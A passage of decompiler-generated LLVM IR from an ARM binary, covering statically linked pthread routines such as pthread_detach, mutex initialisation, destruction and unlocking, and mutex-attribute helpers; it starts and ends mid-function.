  store i8 0, i8* %v2_214d0, align 1
  br label %dec_label_pc_214f4

dec_label_pc_214f4:                               ; preds = %dec_label_pc_214a8, %dec_label_pc_214ec
  %v2_214fc = call i32 @__pthread_do_exit(i32 -1, i32 %v2_21398)
  br label %dec_label_pc_21500

dec_label_pc_21500:                               ; preds = %dec_label_pc_214dc, %dec_label_pc_214b8, %dec_label_pc_214f4
  %v0_21504 = load i32, i32* @r5, align 4
  store i32 %v0_21504, i32* @r0, align 4
  %v0_21508 = call i32 @__pthread_lock()
  br label %dec_label_pc_2150c

dec_label_pc_2150c:                               ; preds = %dec_label_pc_21450, %dec_label_pc_21500
  %v0_2150c = load i32, i32* @sl, align 4
  %v2_2150c = icmp eq i32 %v0_2150c, 0
  br i1 %v2_2150c, label %.thread1, label %bb20

.thread1:                                         ; preds = %dec_label_pc_2150c
  %v0_215142 = load i32, i32* @r5, align 4
  br label %bb21

bb20:                                             ; preds = %dec_label_pc_2150c
  %v1_21510 = load i32, i32* @r4, align 4
  %v2_21510 = add i32 %v1_21510, 48
  %v3_21510 = inttoptr i32 %v2_21510 to i32*
  %v4_21510 = load i32, i32* %v3_21510, align 4
  %v0_21514 = load i32, i32* @r5, align 4
  %v3_21518 = inttoptr i32 %v0_2150c to i32*
  store i32 %v4_21510, i32* %v3_21518, align 4
  br label %bb21

bb21:                                             ; preds = %.thread1, %bb20
  %v0_215143 = phi i32 [ %v0_215142, %.thread1 ], [ %v0_21514, %bb20 ]
  %v1_2151c = call i32 @__pthread_unlock(i32 %v0_215143)
  %v0_21524 = load i32, i32* @r8, align 4
  %v2_21524 = add i32 %v0_21524, 132
  %v3_21524 = inttoptr i32 %v2_21524 to i32*
  %v4_21524 = load i32, i32* %v3_21524, align 4
  %v1_21528 = inttoptr i32 %v4_21524 to i32*
  %v2_21528 = load i32, i32* %v1_21528, align 4
  %v1_2152c = icmp slt i32 %v2_21528, 0
  br i1 %v1_2152c, label %dec_label_pc_21574, label %dec_label_pc_21534

dec_label_pc_21534:                               ; preds = %bb21
  store i32 %v0_213a4, i32* %stack_var_-72, align 4
  store i32 %v4_21524, i32* @r5, align 4
  store i32 %v2_21398, i32* @r4, align 4
  br label %dec_label_pc_2154c

dec_label_pc_2154c:                               ; preds = %dec_label_pc_21564.dec_label_pc_2154c_crit_edge, %dec_label_pc_21534
  %v0_2154c = phi i32 [ %v0_2154c.pre, %dec_label_pc_21564.dec_label_pc_2154c_crit_edge ], [ %v4_21524, %dec_label_pc_21534 ]
  %v1_2154c = inttoptr i32 %v0_2154c to i32*
  %v2_2154c = load i32, i32* %v1_2154c, align 4
  %v3_21558 = call i32 @write(i32 %v2_2154c, i32 %v2_21398, i32 28)
  %v3_2155c = icmp eq i32 %v3_21558, -1
  br i1 %v3_2155c, label %dec_label_pc_21564, label %dec_label_pc_21574

dec_label_pc_21564:                               ; preds = %dec_label_pc_2154c
  %v0_21564 = call i32 @__errno_location()
  %v1_21568 = inttoptr i32 %v0_21564 to i32*
  %v2_21568 = load i32, i32* %v1_21568, align 4
  %v7_2156c = icmp eq i32 %v2_21568, 4
  br i1 %v7_2156c, label %dec_label_pc_21564.dec_label_pc_2154c_crit_edge, label %dec_label_pc_21574

dec_label_pc_21564.dec_label_pc_2154c_crit_edge:  ; preds = %dec_label_pc_21564
  %v0_2154c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2154c

dec_label_pc_21574:                               ; preds = %dec_label_pc_2154c, %dec_label_pc_21564, %bb21
  br label %dec_label_pc_21578

dec_label_pc_21578:                               ; preds = %dec_label_pc_21440, %dec_label_pc_21418, %dec_label_pc_213fc, %dec_label_pc_21574
  %v1_21580 = phi i32 [ 22, %dec_label_pc_21440 ], [ 35, %dec_label_pc_21418 ], [ 3, %dec_label_pc_213fc ], [ 0, %dec_label_pc_21574 ]
  ret i32 %v1_21580

; uselistorder directives
  uselistorder i32 %v0_213e4, { 2, 1, 0, 3 }
  uselistorder i32 %v5_213c0, { 1, 0, 2 }
  uselistorder i32 %v0_213a4, { 2, 1, 5, 6, 4, 7, 3, 8, 0, 10, 9, 11 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 1, 0, 5, 4, 3, 2, 6 }
  uselistorder i32 (i32)* @_suspend.10, { 1, 0 }
  uselistorder i32 66, { 10, 1, 2, 3, 4, 11, 6, 5, 0, 7, 8, 9 }
  uselistorder i32 (i32, i32)* @___pthread_set_own_extricate_if.8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_21578, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_21574, { 1, 0, 2 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_2150c, { 1, 0 }
  uselistorder label %dec_label_pc_21500, { 2, 0, 1 }
  uselistorder label %dec_label_pc_214f4, { 1, 0 }
  uselistorder label %dec_label_pc_21498, { 1, 0 }
  uselistorder label %dec_label_pc_21440, { 1, 0 }
}

define i32 @pthread_detach(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_21594 = load i32, i32* @r4, align 4
  store i32 %v3_21594, i32* %stack_var_-24, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_215a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v3_215ac = urem i32 %arg1, 1024
  %v4_215b0 = mul nuw nsw i32 %v3_215ac, 16
  %v5_215b0 = add i32 %v4_215a4, %v4_215b0
  store i32 %v5_215b0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v5_215b0, i32* @r0, align 4
  %v0_215c4 = call i32 @__pthread_lock()
  %v0_215c8 = load i32, i32* @r5, align 4
  %v1_215c8 = add i32 %v0_215c8, 8
  %v2_215c8 = inttoptr i32 %v1_215c8 to i32*
  %v3_215c8 = load i32, i32* %v2_215c8, align 4
  %v2_215cc = icmp eq i32 %v3_215c8, 0
  br i1 %v2_215cc, label %dec_label_pc_215e0, label %dec_label_pc_215d4

dec_label_pc_215d4:                               ; preds = %entry
  %v1_215d4 = add i32 %v3_215c8, 16
  %v2_215d4 = inttoptr i32 %v1_215d4 to i32*
  %v3_215d4 = load i32, i32* %v2_215d4, align 4
  store i32 %v3_215d4, i32* @r7, align 4
  %v1_215d8 = load i32, i32* @r4, align 4
  %v9_215d8 = icmp eq i32 %v3_215d4, %v1_215d8
  br i1 %v9_215d8, label %dec_label_pc_215f0, label %dec_label_pc_215e0

dec_label_pc_215e0:                               ; preds = %dec_label_pc_215d4, %entry
  %v1_215e4 = call i32 @__pthread_unlock(i32 %v0_215c8)
  br label %dec_label_pc_21698

dec_label_pc_215f0:                               ; preds = %dec_label_pc_215d4
  %v1_215f0 = add i32 %v3_215c8, 45
  %v2_215f0 = inttoptr i32 %v1_215f0 to i8*
  %v3_215f0 = load i8, i8* %v2_215f0, align 1
  %v4_215f0 = zext i8 %v3_215f0 to i32
  store i32 %v4_215f0, i32* %r4.global-to-local, align 4
  %v2_215f4 = icmp eq i8 %v3_215f0, 0
  br i1 %v2_215f4, label %dec_label_pc_2160c, label %dec_label_pc_215fc

dec_label_pc_215fc:                               ; preds = %dec_label_pc_215f0
  %v1_21600 = call i32 @__pthread_unlock(i32 %v0_215c8)
  br label %dec_label_pc_21698

dec_label_pc_2160c:                               ; preds = %dec_label_pc_215f0
  %v1_2160c = add i32 %v3_215c8, 56
  %v2_2160c = inttoptr i32 %v1_2160c to i32*
  %v3_2160c = load i32, i32* %v2_2160c, align 4
  %v2_21610 = icmp eq i32 %v3_2160c, 0
  br i1 %v2_21610, label %dec_label_pc_21628, label %dec_label_pc_21618

dec_label_pc_21618:                               ; preds = %dec_label_pc_2160c
  %v1_2161c = call i32 @__pthread_unlock(i32 %v0_215c8)
  %v0_21620 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_21698

dec_label_pc_21628:                               ; preds = %dec_label_pc_2160c
  %v1_21628 = add i32 %v3_215c8, 44
  %v2_21628 = inttoptr i32 %v1_21628 to i8*
  %v3_21628 = load i8, i8* %v2_21628, align 1
  %v4_21628 = zext i8 %v3_21628 to i32
  store i32 %v4_21628, i32* %r4.global-to-local, align 4
  store i8 1, i8* %v2_215f0, align 1
  %v0_21634 = load i32, i32* @r5, align 4
  %v1_21638 = call i32 @__pthread_unlock(i32 %v0_21634)
  %v0_2163c = load i32, i32* %r4.global-to-local, align 4
  %v2_2163c = icmp eq i32 %v0_2163c, 0
  br i1 %v2_2163c, label %dec_label_pc_21694, label %dec_label_pc_21644

dec_label_pc_21644:                               ; preds = %dec_label_pc_21628
  %v0_21648 = load i32, i32* @r6, align 4
  %v2_21648 = add i32 %v0_21648, 132
  %v3_21648 = inttoptr i32 %v2_21648 to i32*
  %v4_21648 = load i32, i32* %v3_21648, align 4
  store i32 %v4_21648, i32* %r4.global-to-local, align 4
  %v1_2164c = inttoptr i32 %v4_21648 to i32*
  %v2_2164c = load i32, i32* %v1_2164c, align 4
  %v1_21650 = icmp slt i32 %v2_2164c, 0
  br i1 %v1_21650, label %dec_label_pc_21694, label %dec_label_pc_21658

dec_label_pc_21658:                               ; preds = %dec_label_pc_21644
  %v0_21658 = call i32 @_thread_self.9()
  store i32 %v0_21658, i32* %stack_var_-52, align 4
  %v0_21664 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_21664, i32* @r5, align 4
  %v2_21668 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_21668, i32* @r4, align 4
  br label %dec_label_pc_2166c

dec_label_pc_2166c:                               ; preds = %dec_label_pc_21684.dec_label_pc_2166c_crit_edge, %dec_label_pc_21658
  %v0_21674 = phi i32 [ %v0_21674.pre, %dec_label_pc_21684.dec_label_pc_2166c_crit_edge ], [ %v0_21664, %dec_label_pc_21658 ]
  %v1_21674 = inttoptr i32 %v0_21674 to i32*
  %v2_21674 = load i32, i32* %v1_21674, align 4
  %v3_21678 = call i32 @write(i32 %v2_21674, i32 %v2_21668, i32 28)
  %v3_2167c = icmp eq i32 %v3_21678, -1
  br i1 %v3_2167c, label %dec_label_pc_21684, label %dec_label_pc_21694

dec_label_pc_21684:                               ; preds = %dec_label_pc_2166c
  %v0_21684 = call i32 @__errno_location()
  %v1_21688 = inttoptr i32 %v0_21684 to i32*
  %v2_21688 = load i32, i32* %v1_21688, align 4
  %v7_2168c = icmp eq i32 %v2_21688, 4
  br i1 %v7_2168c, label %dec_label_pc_21684.dec_label_pc_2166c_crit_edge, label %dec_label_pc_21694

dec_label_pc_21684.dec_label_pc_2166c_crit_edge:  ; preds = %dec_label_pc_21684
  %v0_21674.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2166c

dec_label_pc_21694:                               ; preds = %dec_label_pc_2166c, %dec_label_pc_21684, %dec_label_pc_21644, %dec_label_pc_21628
  br label %dec_label_pc_21698

dec_label_pc_21698:                               ; preds = %dec_label_pc_21618, %dec_label_pc_215fc, %dec_label_pc_215e0, %dec_label_pc_21694
  %v1_216a0 = phi i32 [ %v0_21620, %dec_label_pc_21618 ], [ 22, %dec_label_pc_215fc ], [ 3, %dec_label_pc_215e0 ], [ 0, %dec_label_pc_21694 ]
  %v2_2169c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2169c, i32* %r4.global-to-local, align 4
  ret i32 %v1_216a0

; uselistorder directives
  uselistorder i32 %v0_215c8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 ()* @__errno_location, { 33, 3, 2, 32, 31, 8, 7, 30, 29, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 34, 15, 14, 13, 12, 11, 36, 35, 10, 9, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32)* @write, { 10, 1, 0, 5, 4, 9, 8, 11, 7, 3, 6, 2 }
  uselistorder i32 ()* @_thread_self.9, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_21698, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_21694, { 1, 0, 2, 3 }
}

define i32 @function_216a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_216a8:
  %v0_216a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_216a8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_216a8
  %v2_216a8 = load i32, i32* @r4, align 4
  %v8_216a8 = ashr i32 %v2_216a8, %arg1
  %v9_216a8 = and i32 %v8_216a8, %arg1
  %v4_216ac = mul i32 %v2_216a8, 2
  %v5_216ac = and i32 %v9_216a8, %v4_216ac
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_216a8, %bb
  %v6_216ac = phi i32 [ %arg1, %dec_label_pc_216a8 ], [ %v5_216ac, %bb ]
  ret i32 %v6_216ac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_216b8 = ptrtoint i32* %stack_var_-28 to i32
  %v2_216c0 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-28)
  %v3_216cc = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-28, i32 1)
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  %v4_216dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 108) to i32*), align 4
  %v1_216e0 = inttoptr i32 %v4_216dc to i32*
  %v2_216e0 = load i32, i32* %v1_216e0, align 4
  store i32 %v2_216e0, i32* %r5.global-to-local, align 4
  store i32 68, i32* %r7.global-to-local, align 4
  %v2_216fc2 = icmp eq i32 %v2_216e0, 0
  br i1 %v2_216fc2, label %dec_label_pc_2170c, label %dec_label_pc_216ec

dec_label_pc_216ec:                               ; preds = %entry, %dec_label_pc_216ec.dec_label_pc_216ec_crit_edge
  %v1_216ec = phi i32 [ %v1_216ec.pre, %dec_label_pc_216ec.dec_label_pc_216ec_crit_edge ], [ 68, %entry ]
  %v0_216ec = phi i32 [ %v0_216ec.pre, %dec_label_pc_216ec.dec_label_pc_216ec_crit_edge ], [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ]
  %v2_216ec = add i32 %v0_216ec, %v1_216ec
  %v3_216ec = inttoptr i32 %v2_216ec to i32*
  %v4_216ec = load i32, i32* %v3_216ec, align 4
  store i32 %v4_216ec, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_216ec)
  %v0_216f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_216f8 = add i32 %v0_216f8, 32
  %v2_216f8 = inttoptr i32 %v1_216f8 to i32*
  %v3_216f8 = load i32, i32* %v2_216f8, align 4
  store i32 %v3_216f8, i32* %r5.global-to-local, align 4
  %v2_216fc = icmp eq i32 %v3_216f8, 0
  br i1 %v2_216fc, label %dec_label_pc_2170c, label %dec_label_pc_216ec.dec_label_pc_216ec_crit_edge

dec_label_pc_216ec.dec_label_pc_216ec_crit_edge:  ; preds = %dec_label_pc_216ec
  %v0_216ec.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_216ec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_216ec

dec_label_pc_2170c:                               ; preds = %dec_label_pc_216ec, %entry
  %v2_21710 = call i32 @pthread_mutexattr_destroy(i32 %v2_216b8, i32 %v2_216b8)
  ret i32 %v2_21710

; uselistorder directives
  uselistorder label %dec_label_pc_216ec, { 1, 0 }
}

define i32 @function_21724(i32 %arg1) local_unnamed_addr {
dec_label_pc_21724:
  %v0_21724 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21724, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_21724
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_21724, %bb
  %v4_21728 = phi i32 [ %arg1, %dec_label_pc_21724 ], [ 0, %bb ]
  ret i32 %v4_21728

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_21774 = add i32 %arg1, 20
  %v3_21774 = inttoptr i32 %v2_21774 to i32*
  store i32 0, i32* %v3_21774, align 4
  %v0_21778 = load i32, i32* %r1.global-to-local, align 4
  %v2_21778 = icmp eq i32 %v0_21778, 0
  br i1 %v2_21778, label %bb, label %._crit_edge

._crit_edge:                                      ; preds = %entry
  %v2_2177c = inttoptr i32 %v0_21778 to i32*
  %v3_2177c = load i32, i32* %v2_2177c, align 4
  store i32 %v3_2177c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v0_21784 = load i32, i32* %r3.global-to-local, align 4
  %v2_21784 = add i32 %arg1, 16
  %v3_21784 = inttoptr i32 %v2_21784 to i32*
  store i32 %v0_21784, i32* %v3_21784, align 4
  %v0_21790.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb5

bb:                                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v0_217842 = load i32, i32* %r3.global-to-local, align 4
  %v2_217843 = add i32 %arg1, 16
  %v3_217844 = inttoptr i32 %v2_217843 to i32*
  store i32 %v0_217842, i32* %v3_217844, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %._crit_edge, %bb
  %v0_21790 = phi i32 [ %v0_21790.pre, %._crit_edge ], [ 3, %bb ]
  %v1_21790 = load i32, i32* %r2.global-to-local, align 4
  %v2_21790 = add i32 %v1_21790, 12
  %v3_21790 = inttoptr i32 %v2_21790 to i32*
  store i32 %v0_21790, i32* %v3_21790, align 4
  %v1_21794 = load i32, i32* %r2.global-to-local, align 4
  %v2_21794 = add i32 %v1_21794, 8
  %v3_21794 = inttoptr i32 %v2_21794 to i32*
  store i32 0, i32* %v3_21794, align 4
  %v1_21798 = load i32, i32* %r2.global-to-local, align 4
  %v2_21798 = add i32 %v1_21798, 4
  %v3_21798 = inttoptr i32 %v2_21798 to i32*
  store i32 0, i32* %v3_21798, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_217a0 = add i32 %arg1, 12
  %v2_217a0 = inttoptr i32 %v1_217a0 to i32*
  %v3_217a0 = load i32, i32* %v2_217a0, align 4
  %tmp = icmp ult i32 %v3_217a0, 4
  br i1 %tmp, label %bb, label %dec_label_pc_217c0

bb:                                               ; preds = %entry
  %v7_217a8 = mul i32 %v3_217a0, 4
  %v8_217a8 = add i32 %v7_217a8, ptrtoint (i32* @global_var_217b0.1480 to i32)
  call void @__pseudo_branch(i32 %v8_217a8)
  br label %dec_label_pc_217c0

dec_label_pc_217c0:                               ; preds = %bb, %entry
  ret i32 22

; uselistorder directives
  uselistorder i32 %v3_217a0, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_2180c = icmp ugt i32 %arg2, 2
  %v7_2180c = icmp eq i32 %arg2, 3
  %v2_21810 = xor i1 %v2_2180c, true
  %v3_21810 = or i1 %v7_2180c, %v2_21810
  br i1 %v3_21810, label %bb, label %bb2

bb:                                               ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v2_21814 = xor i1 %v7_2180c, true
  %v3_21814 = and i1 %v2_2180c, %v2_21814
  br i1 %v3_21814, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  store i32 22, i32* %r0.global-to-local, align 4
  br label %bb4

bb4:                                              ; preds = %bb2, %bb3
  br i1 %v3_21810, label %bb5, label %._crit_edge

._crit_edge:                                      ; preds = %bb4
  %v1_2181c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb6

bb5:                                              ; preds = %bb4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %._crit_edge, %bb5
  %v1_2181c = phi i32 [ %v1_2181c.pre, %._crit_edge ], [ 0, %bb5 ]
  ret i32 %v1_2181c

; uselistorder directives
  uselistorder i1 %v2_2180c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_21820 = load i32, i32* %arg1, align 4
  %v2_21828 = inttoptr i32 %arg2 to i32*
  store i32 %v2_21820, i32* %v2_21828, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %arg1.cmp = icmp ugt i32 %arg1, 1
  br i1 %arg1.cmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_21844 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %arg1.cmp, i32 %v0_21844)
  %v2_21848 = icmp eq i32 %arg1, 0
  %. = select i1 %v2_21848, i32 0, i32 38
  ret i32 %.

; uselistorder directives
  uselistorder i1 %arg1.cmp, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_21858 = load i32, i32* @r4, align 4
  store i32 %v3_21858, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -143904))
  %v3_2188c = call i32 @pthread_cond_init(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38716) to i32*), i32 0)
  %v4_21894 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38728) to i32*), align 4
  %v7_2189c = icmp sgt i32 %v4_21894, 2147483643
  %v9_2189c = add i32 %v4_21894, 4
  %storemerge = select i1 %v7_2189c, i32 0, i32 %v9_2189c
  store i32 %storemerge, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38728) to i32*), align 4
  %v2_218a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_218a8, i32* @r4, align 4
  ret i32 %v3_2188c

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38728) to i32*), { 1, 0 }
}

define i32 @_thread_self.11() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_218d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_218d8 = inttoptr i32 %v4_218d4 to i32*
  %v2_218d8 = load i32, i32* %v1_218d8, align 4
  %v2_218dc = ptrtoint i32* %stack_var_-8 to i32
  %v3_218e0 = icmp ult i32 %v2_218dc, %v2_218d8
  br i1 %v3_218e0, label %dec_label_pc_218f0, label %dec_label_pc_2191c

dec_label_pc_218f0:                               ; preds = %entry
  %v4_218f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_218f8 = inttoptr i32 %v4_218f4 to i32*
  %v2_218f8 = load i32, i32* %v1_218f8, align 4
  %v3_218fc = icmp ult i32 %v2_218dc, %v2_218f8
  br i1 %v3_218fc, label %dec_label_pc_21924, label %dec_label_pc_21904

dec_label_pc_21904:                               ; preds = %dec_label_pc_218f0
  %v4_21908 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_2190c = inttoptr i32 %v4_21908 to i32*
  %v2_2190c = load i32, i32* %v1_2190c, align 4
  %v3_21910 = icmp ult i32 %v2_218dc, %v2_2190c
  br i1 %v3_21910, label %dec_label_pc_2191c, label %dec_label_pc_21924

dec_label_pc_2191c:                               ; preds = %dec_label_pc_21904, %entry
  %v1_2191c = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_21904 ]
  %v3_2191c = inttoptr i32 %v1_2191c to i32*
  %v4_2191c = load i32, i32* %v3_2191c, align 4
  br label %dec_label_pc_21950

dec_label_pc_21924:                               ; preds = %dec_label_pc_21904, %dec_label_pc_218f0
  %v4_21928 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_2192c = inttoptr i32 %v4_21928 to i32*
  %v2_2192c = load i32, i32* %v1_2192c, align 4
  %v2_21930 = icmp eq i32 %v2_2192c, 0
  br i1 %v2_21930, label %dec_label_pc_21940, label %dec_label_pc_21938

dec_label_pc_21938:                               ; preds = %dec_label_pc_21924
  %v0_21938 = call i32 @__pthread_find_self()
  br label %dec_label_pc_21950

dec_label_pc_21940:                               ; preds = %dec_label_pc_21924
  %v3_21940 = and i32 %v2_218dc, -2097152
  %v4_21940 = xor i32 %v3_21940, -2097152
  %v1_2194c = sub i32 -352, %v4_21940
  br label %dec_label_pc_21950

dec_label_pc_21950:                               ; preds = %dec_label_pc_21938, %dec_label_pc_2191c, %dec_label_pc_21940
  %v1_21958 = phi i32 [ %v0_21938, %dec_label_pc_21938 ], [ %v4_2191c, %dec_label_pc_2191c ], [ %v1_2194c, %dec_label_pc_21940 ]
  ret i32 %v1_21958

; uselistorder directives
  uselistorder label %dec_label_pc_21950, { 2, 0, 1 }
}

define i32 @function_21960(i16* %arg1) local_unnamed_addr {
dec_label_pc_21960:
  %v0_21960 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21960, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_21960
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_21960
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_21978 = load i32, i32* @r4, align 4
  store i32 %v3_21978, i32* %stack_var_-12, align 4
  %v1_2197c = add i32 %arg1, 12
  %v2_2197c = inttoptr i32 %v1_2197c to i32*
  %v3_2197c = load i32, i32* %v2_2197c, align 4
  %v7_21988 = icmp eq i32 %v3_2197c, 3
  store i1 %v7_21988, i1* @cpsr_z, align 1
  %tmp = icmp ult i32 %v3_2197c, 4
  br i1 %tmp, label %bb, label %dec_label_pc_219a4

bb:                                               ; preds = %entry
  %v7_2198c = mul i32 %v3_2197c, 4
  %v8_2198c = add i32 %v7_2198c, ptrtoint (i32* @global_var_21994.1494 to i32)
  call void @__pseudo_branch(i32 %v8_2198c)
  %v2_21a40.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_219a4

dec_label_pc_219a4:                               ; preds = %bb, %entry
  %v2_21a40 = phi i32 [ %v2_21a40.pre, %bb ], [ %v3_21978, %entry ]
  store i32 %v2_21a40, i32* @r4, align 4
  ret i32 22

; uselistorder directives
  uselistorder i32 %v3_2197c, { 1, 0, 2 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_21a58 = call i32 @pthread_mutex_unlock(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38692))
  %v0_21a5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21a5c, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v1_21a58

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_21a64 = add i32 %arg2, 4
  %v2_21a64 = inttoptr i32 %v1_21a64 to i32*
  %v3_21a64 = load i32, i32* %v2_21a64, align 4
  %tmp = icmp ugt i32 %v3_21a64, 999999999
